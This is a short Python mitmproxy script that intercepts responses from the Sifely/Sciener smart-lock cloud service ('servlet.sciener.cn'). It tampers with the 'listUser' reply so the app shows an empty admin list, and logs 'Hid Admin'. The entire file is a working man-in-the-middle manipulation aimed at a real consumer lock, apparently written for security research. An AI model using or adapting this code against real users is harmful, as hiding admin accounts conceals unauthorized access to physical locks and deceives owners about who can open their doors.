"""
This script clears the list of admins on the Sifely lock
"""

from mitmproxy import http, ctx
import json

def response(flow: http.HTTPFlow) -> None:
    if "servlet.sciener.cn" in flow.request.pretty_host and "listUser" in flow.request.url:
       data = json.loads(flow.response.content)
       data['list']=[]       
       data['total']=0 
       flow.response.content = bytes(json.dumps(data), 'utf-8')
       ctx.log.alert("[Sifely] Hid Admin")
